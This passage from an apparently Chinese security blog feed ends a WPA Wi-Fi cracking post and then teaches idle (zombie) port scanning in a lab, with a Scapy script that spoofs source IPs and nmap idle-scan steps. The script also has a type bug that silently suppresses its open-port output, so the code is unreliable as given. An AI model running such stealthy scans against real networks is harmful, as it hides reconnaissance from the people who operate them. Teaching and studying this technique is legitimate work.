<h2 id="0x06-防御"><a href="#0x06-防御" class="headerlink" title="0x06. 防御"></a><strong>0x06. 防御</strong></h2><h4 id="emsp-emsp-其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。"><a href="#emsp-emsp-其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。" class="headerlink" title="&emsp;&emsp;其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。"></a>&emsp;&emsp;其实基于WPA加密的Wi-Fi是很不容易破解的，只要密码设的足够复杂，就算是黑客也不是那么轻松就能攻破的，所以大家还是尽早放弃弱密码吧，免得江湖上又一轮腥风血雨。</h4><hr>
<h2 id="0x06-后续"><a href="#0x06-后续" class="headerlink" title="0x06. 后续"></a><strong>0x06. 后续</strong></h2><h4 id="emsp-emsp-大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！"><a href="#emsp-emsp-大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！" class="headerlink" title="&emsp;&emsp;大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！"></a>&emsp;&emsp;大家也可以实战试试能否破解自己家的Wi-Fi，接下来会推出wps和wep的密码破解，关于破解Wi-Fi密码之后的攻击手法也会在后面陆续推出，感兴趣的朋友可以关注公众号动态，喜欢的朋友可以分享到朋友圈帮忙将知识分享给更多的人！！</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[信息收集— 僵尸扫描]]></title>
      <url>/2017/08/29/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%20%E5%83%B5%E5%B0%B8%E6%89%AB%E6%8F%8F/</url>
      <content type="html"><![CDATA[<h2 id="0x00-信息收集简介"><a href="#0x00-信息收集简介" class="headerlink" title="0x00. 信息收集简介"></a><strong>0x00. 信息收集简介</strong></h2><h4 id="emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。"><a href="#emsp-emsp-渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60-左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。" class="headerlink" title="&emsp;&emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。"></a>&emsp;&emsp;渗透测试中，信息收集是最重要的阶段，占据整个渗透测试的60%左右，根据收集到的信息可以有效提高我们渗透测试的成功率，可见高效的信息收集对我们是多么重要。僵尸扫描正是信息收集环节的端口扫描阶段，但是常见的端口扫描过程往往会在网络层被发现痕迹，导致没有达到预期的隐藏目的，僵尸扫描却能有效的隐藏自己的踪迹。</h4><a id="more"></a>
<hr>
<h2 id="0x01-僵尸扫描介绍"><a href="#0x01-僵尸扫描介绍" class="headerlink" title="0x01. 僵尸扫描介绍"></a><strong>0x01. 僵尸扫描介绍</strong></h2><h3 id="emsp-emsp-往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件"><a href="#emsp-emsp-往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件" class="headerlink" title="&emsp;&emsp;往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件"></a>&emsp;&emsp;往往鱼与熊掌不可得兼，僵尸扫描在隐藏踪迹的同时也有着其极其苛刻的使用条件。想要实施僵尸扫描必须具备下列两个必要条件</h3><h4 id="emsp-emsp-其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。"><a href="#emsp-emsp-其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。" class="headerlink" title="&emsp;&emsp;其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。"></a>&emsp;&emsp;其一：有一台合格的僵尸机，所谓的僵尸机就是足够空闲，并且不和除了我们之外的任何其他机器进行网络通信的主机，这个主要取决于他的IPID的连续性（往往主流的操作系统的IPID都是随机产生的或全为0），后面会讲到。</h4><h4 id="emsp-emsp-其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。"><a href="#emsp-emsp-其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。" class="headerlink" title="&emsp;&emsp;其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。"></a>&emsp;&emsp;其二：可伪造源IP地址，在某些网络设备中防火墙会限制伪造的源地址，导致扫描失败。</h4><hr>
<h2 id="0x02-僵尸扫描过程"><a href="#0x02-僵尸扫描过程" class="headerlink" title="0x02. 僵尸扫描过程"></a><strong>0x02. 僵尸扫描过程</strong></h2><p><img src="http://note.youdao.com/yws/public/resource/e55c97293d502f9ed0b9f032d920edbe/xmlnote/WEBRESOURCEb291547ca7a5e22852fd05ca2f2541ec/394" alt="image"></p>
<h3 id="如上图所示，该图清晰的像我们展示了僵尸扫描的全过程"><a href="#如上图所示，该图清晰的像我们展示了僵尸扫描的全过程" class="headerlink" title="如上图所示，该图清晰的像我们展示了僵尸扫描的全过程"></a>如上图所示，该图清晰的像我们展示了僵尸扫描的全过程</h3><h4 id="emsp-emsp-一-首先由本地主机-scanner-向僵尸机-zombie-发送一个SYN-ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN-ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID-假设此时的IPID-x。详细的tcp-ip通信过程点击这里"><a href="#emsp-emsp-一-首先由本地主机-scanner-向僵尸机-zombie-发送一个SYN-ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN-ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID-假设此时的IPID-x。详细的tcp-ip通信过程点击这里" class="headerlink" title="&emsp;&emsp;一.首先由本地主机(scanner)向僵尸机(zombie)发送一个SYN/ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN/ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID,假设此时的IPID=x。详细的tcp/ip通信过程点击这里"></a>&emsp;&emsp;一.首先由本地主机(scanner)向僵尸机(zombie)发送一个SYN/ACK包，因为发送的数据包不是SYN包，所以zombie会觉得莫名奇妙居然会有人向我发送SYN/ACK包，于是zombie会原路返回一个RST包来中断连接，此时在RST包中便会带有zombie的IPID,假设此时的IPID=x。详细的tcp/ip通信过程点击<a href="http://www.cnblogs.com/rootq/articles/1377355.html" target="_blank" rel="external">这里</a></h4><h4 id="emsp-emsp-二-紧接着又由本地主机-scanner-伪造源IP-SRC地址为zombie的IP，指定一个端口号并向目标主机-target-发送一个SYN包。收到SYN包后如果target端口开放-便会给源IP-SRC返回一个SYN-ACK包，此时由zombie收到该SYN-ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID-x-1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID-x。"><a href="#emsp-emsp-二-紧接着又由本地主机-scanner-伪造源IP-SRC地址为zombie的IP，指定一个端口号并向目标主机-target-发送一个SYN包。收到SYN包后如果target端口开放-便会给源IP-SRC返回一个SYN-ACK包，此时由zombie收到该SYN-ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID-x-1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID-x。" class="headerlink" title="&emsp;&emsp;二.紧接着又由本地主机(scanner)伪造源IP.SRC地址为zombie的IP，指定一个端口号并向目标主机(target)发送一个SYN包。收到SYN包后如果target端口开放,便会给源IP.SRC返回一个SYN/ACK包，此时由zombie收到该SYN/ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID=x+1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID=x。"></a>&emsp;&emsp;二.紧接着又由本地主机(scanner)伪造源IP.SRC地址为zombie的IP，指定一个端口号并向目标主机(target)发送一个SYN包。收到SYN包后如果target端口开放,便会给源IP.SRC返回一个SYN/ACK包，此时由zombie收到该SYN/ACK包，此时便会同第一步一样，给target返回一个RST包，此时的IPID=x+1。如果端口未开放，target会直接给zombie返回一个RST包，zombie不做任何回应，IPID=x。</h4><h4 id="emsp-emsp-三-最后再由本地主机-scanner-给zombie发送一个SYN-ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID-x-1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID-x-2则第二步时zombie发送了一个RST包，于是可知target端口开放。"><a href="#emsp-emsp-三-最后再由本地主机-scanner-给zombie发送一个SYN-ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID-x-1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID-x-2则第二步时zombie发送了一个RST包，于是可知target端口开放。" class="headerlink" title="&emsp;&emsp;三. 最后再由本地主机(scanner)给zombie发送一个SYN/ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID=x+1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID=x+2则第二步时zombie发送了一个RST包，于是可知target端口开放。"></a>&emsp;&emsp;三. 最后再由本地主机(scanner)给zombie发送一个SYN/ACK包，步骤和第一步一样，zombie返回一个RST包，但是此时的IPID和第一步有差别，我们便通过IPID所差的值判断target端口是否开放。如果此时的IPID=x+1则第二步时zombie没有发送任何数据包，于是可知target端口关闭；如果IPID=x+2则第二步时zombie发送了一个RST包，于是可知target端口开放。</h4><hr>
<h2 id="0x03-僵尸扫描实战篇"><a href="#0x03-僵尸扫描实战篇" class="headerlink" title="0x03. 僵尸扫描实战篇"></a><strong>0x03. 僵尸扫描实战篇</strong></h2><h4 id="emsp-emsp-看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just-soso-下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅"><a href="#emsp-emsp-看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just-soso-下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅" class="headerlink" title="&emsp;&emsp;看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just soso!下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅!"></a>&emsp;&emsp;看我写了这么多相信很多人都已经蒙圈了吧，理论有时后确实不容易理解，但是一旦理解了便会觉得just soso!下面我直接给大家实战演习，看完实战篇再来看理论相信大家会获益匪浅!</h4><h3 id="一：环境准备"><a href="#一：环境准备" class="headerlink" title="一：环境准备"></a>一：环境准备</h3><h4 id="emsp-emsp-扫描主机-Mac-ip-192-168-0-103"><a href="#emsp-emsp-扫描主机-Mac-ip-192-168-0-103" class="headerlink" title="&emsp;&emsp;扫描主机 Mac: { ip:192.168.0.103 }"></a>&emsp;&emsp;扫描主机 Mac: { ip:192.168.0.103 }</h4><h4 id="emsp-emsp-僵尸主机-xp-ip-192-168-0-107"><a href="#emsp-emsp-僵尸主机-xp-ip-192-168-0-107" class="headerlink" title="&emsp;&emsp;僵尸主机 xp: { ip:192.168.0.107 }"></a>&emsp;&emsp;僵尸主机 xp: { ip:192.168.0.107 }</h4><h4 id="emsp-emsp-目标主机-metasploitable2-ip-192-168-0-105"><a href="#emsp-emsp-目标主机-metasploitable2-ip-192-168-0-105" class="headerlink" title="&emsp;&emsp;目标主机 metasploitable2: { ip:192.168.0.105 }"></a>&emsp;&emsp;目标主机 metasploitable2: { ip:192.168.0.105 }</h4><h3 id="二-python2-7脚本"><a href="#二-python2-7脚本" class="headerlink" title="二: python2.7脚本"></a>二: python2.7脚本</h3><h4 id="emsp-emsp-其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本-完整的脚本我放在云盘上-，用来发现僵尸机-zombie-和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。"><a href="#emsp-emsp-其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本-完整的脚本我放在云盘上-，用来发现僵尸机-zombie-和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。" class="headerlink" title="&emsp;&emsp;其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本(完整的脚本我放在云盘上)，用来发现僵尸机(zombie)和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。"></a>&emsp;&emsp;其实nmap自带有僵尸扫描模块，但是我这里需要抓包给大家分析，所以自己写了个简单的python脚本(完整的脚本我放在<a href="https://pan.baidu.com/s/1kUGwT6n" target="_blank" rel="external">云盘</a>上)，用来发现僵尸机(zombie)和抓包分析，后面会直接演示如何用nmap进行僵尸机发现和利用。</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">zombies_scan</span><span class="params">(zombie_ip)</span>:</span></div><div class="line">	rep1 = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">	send(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>))</div><div class="line">	rep2 = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">	<span class="keyword">if</span> rep2[IP].id == (rep1[IP].id+<span class="number">2</span>):</div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]"</span> + zombie_ip + <span class="string">" is Incremental!"</span></div><div class="line">		target_ip = raw_input(<span class="string">"input the target_ip :"</span>)</div><div class="line">		port_scan(target_ip, zombie_ip)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">print</span> <span class="string">"[*]"</span> + zombie_ip + <span class="string">"is not Incremental!\n"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">port_scan</span><span class="params">(target_ip,zombie_ip)</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"------begin to scan target_ip!-------"</span></div><div class="line">	<span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</div><div class="line">		<span class="keyword">try</span>:</div><div class="line">			start = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>,dport=port),timeout=<span class="number">2</span>)</div><div class="line">			send(IP(src=zombie_ip,dst=target_ip)/TCP(flags=<span class="string">'S'</span>,dport=port))</div><div class="line">			end = sr1(IP(dst=zombie_ip)/TCP(flags=<span class="string">'SA'</span>),timeout=<span class="number">2</span>)</div><div class="line">			<span class="keyword">if</span> end[IP].id == (start[IP].id + <span class="number">2</span>):</div><div class="line">				<span class="keyword">print</span> <span class="string">"[*]"</span> + target_ip + <span class="string">':'</span> + port + <span class="string">"is open"</span></div><div class="line">		<span class="keyword">except</span>:</div><div class="line">			<span class="keyword">pass</span></div></pre></td></tr></table></figure>
<h4 id="第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN-ACK包，通过判断IPID的值来确定是否是个好僵尸。"><a href="#第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN-ACK包，通过判断IPID的值来确定是否是个好僵尸。" class="headerlink" title="第一个函数用来发现僵尸机，利用了Scapy库构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN/ACK包，通过判断IPID的值来确定是否是个好僵尸。"></a>第一个函数用来发现僵尸机，利用了<a href="http://www.secdev.org/projects/scapy/" target="_blank" rel="external">Scapy库</a>构造数据包，原理就是上面所讲的向要探测的僵尸主机连续发送三个SYN/ACK包，通过判断IPID的值来确定是否是个好僵尸。</h4><h4 id="第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。"><a href="#第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。" class="headerlink" title="第二个函数和第一个函数差不多，同样是利用Scapy库构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。"></a>第二个函数和第一个函数差不多，同样是利用<a href="http://www.secdev.org/projects/scapy/" target="_blank" rel="external">Scapy库</a>构造数据包，原理上面第二步有，就不再啰嗦了。下面我来演示一下操作。</h4><h3 id="三-操作步骤"><a href="#三-操作步骤" class="headerlink" title="三: 操作步骤"></a>三: 操作步骤</h3><h4 id="emsp-emsp-1-首先调用第一个函数判断xp是否是僵尸机"><a href="#emsp-emsp-1-首先调用第一个函数判断xp是否是僵尸机" class="headerlink" title="&emsp;&emsp;1.首先调用第一个函数判断xp是否是僵尸机"></a>&emsp;&emsp;1.首先调用第一个函数判断xp是否是僵尸机</h4><p>&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/598b9fdb09cf92d23340b57f089a6af0/xmlnote/3992697E69534B5FBED8277FC7B4DB75/543" alt="image"></p>
<h4 id="emsp-emsp-2-抓包看看第一个函数是不是像我们预想中的那样发包的"><a href="#emsp-emsp-2-抓包看看第一个函数是不是像我们预想中的那样发包的" class="headerlink" title="&emsp;&emsp;2. 抓包看看第一个函数是不是像我们预想中的那样发包的"></a>&emsp;&emsp;2. 抓包看看第一个函数是不是像我们预想中的那样发包的</h4><p><img src="http://note.youdao.com/yws/public/resource/b91afbaa2cf1fba312e9ad33db824b91/xmlnote/722D8CFBF8C5463D982D4D1C1D9CDA9F/553" alt="image"></p>
<h4 id="可以看到发送的数据包正像我们预期中的一样，先发一个SYN-ACK，再收到一个RST-重复三次，判断IPID，这时再来看看IPID如何呢！"><a href="#可以看到发送的数据包正像我们预期中的一样，先发一个SYN-ACK，再收到一个RST-重复三次，判断IPID，这时再来看看IPID如何呢！" class="headerlink" title="可以看到发送的数据包正像我们预期中的一样，先发一个SYN/ACK，再收到一个RST,重复三次，判断IPID，这时再来看看IPID如何呢！"></a>可以看到发送的数据包正像我们预期中的一样，先发一个SYN/ACK，再收到一个RST,重复三次，判断IPID，这时再来看看IPID如何呢！</h4><p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/CC31FE826865413293736F858508266A/563" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/BEDD4C00B4EE4D91BA8BE2E9440CBC87/565" alt="image"></p>
<hr>
<p><img src="http://note.youdao.com/yws/public/resource/bbdd4a1c56e95d7e7d7977fed3245de6/xmlnote/24FE722B2D4141C6ADB1CD8340A07ED2/567" alt="image"></p>
<hr>
<h4 id="emsp-emsp-3-已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。"><a href="#emsp-emsp-3-已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。" class="headerlink" title="&emsp;&emsp;3. 已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。"></a>&emsp;&emsp;3. 已经可以确定xp就是一个好僵尸了，那么接下来便是利用第二个函数对它来进行端口扫描。因为利用zombie时中途会伪装IP，所以我在Wireshark中没有发现连续的包，所以这里就不截数据包的图了。第二个函数的思路很清晰，希望懂python的朋友好好看看。</h4><hr>
<h2 id="0x04-nmap中的僵尸扫描"><a href="#0x04-nmap中的僵尸扫描" class="headerlink" title="0x04. nmap中的僵尸扫描"></a><strong>0x04. nmap中的僵尸扫描</strong></h2><h4 id="emsp-emsp-在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！"><a href="#emsp-emsp-在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！" class="headerlink" title="&emsp;&emsp;在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！"></a>&emsp;&emsp;在介绍nmap之前笔者有一个问题想要探讨一下，就是既然有了nmap这个无敌强大的扫描工具的存在，那么为什么我们还要自己写脚本呢？这里仅仅是我个人的理解，不喜勿喷，笔者认为其实工具仅仅是为了让我们更方便的做一些想做的事情，或许直接调用一个工具再添加一两个参数选项就能超越我们几十上百行脚本，也更能出色的完成任务，但是理解工具工作的原理是否更重要呢！一味的使用别人的工具而不去发现工具工作的原理最后是否只是个工具小子，笔者不屑！</h4><h3 id="emsp-emsp-一：nmap发现僵尸机"><a href="#emsp-emsp-一：nmap发现僵尸机" class="headerlink" title="&emsp;&emsp;一：nmap发现僵尸机"></a>&emsp;&emsp;一：nmap发现僵尸机</h3><p>&emsp;&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/a1a885c4b6b69e213e8ad40885aa4fc2/xmlnote/DDF61F18AB7C4A4183EF9D2F64176A89/605" alt="image"></p>
<h3 id="emsp-emsp-二：nmap利用僵尸机进行端口扫描"><a href="#emsp-emsp-二：nmap利用僵尸机进行端口扫描" class="headerlink" title="&emsp;&emsp;二：nmap利用僵尸机进行端口扫描"></a>&emsp;&emsp;二：nmap利用僵尸机进行端口扫描</h3><p>&emsp;&emsp;&emsp;<img src="http://note.youdao.com/yws/public/resource/a1a885c4b6b69e213e8ad40885aa4fc2/xmlnote/C44E28D7AFBA4D729187D66E8492598E/613" alt="image"></p>
<hr>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05. 总结"></a><strong>0x05. 总结</strong></h2><h4 id="emsp-emsp-虽然僵尸扫描的条件如此苛刻，但是原理just-soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的-o-o"><a href="#emsp-emsp-虽然僵尸扫描的条件如此苛刻，但是原理just-soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的-o-o" class="headerlink" title="&emsp;&emsp;虽然僵尸扫描的条件如此苛刻，但是原理just soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的(o^^o)"></a>&emsp;&emsp;虽然僵尸扫描的条件如此苛刻，但是原理just soso！在某些情况下说不定它还能派上大的用场，免去很多不必要的麻烦，所谓技不压身，多学点知识技能对自己还是很有好处的(o^^o)</h4><hr>
]]></content>
      
        
    </entry>
    
  
  
</search>
